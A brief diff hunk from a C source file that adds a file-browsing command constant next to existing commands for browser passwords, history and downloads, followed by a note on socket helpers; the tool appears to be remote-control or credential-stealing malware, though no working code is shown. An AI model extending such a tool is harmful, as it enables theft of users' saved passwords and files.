@@ -13,6 +13,7 @@
 #define BROWSER_PASS_CMD 5
 #define BROWSER_HISTORY_CMD 6
 #define BROWSER_DL_CMD 7
+#define BROWSE_FILE_CMD 8
 
 // Cross-platform socket abstraction helpers
 #ifdef _WIN32
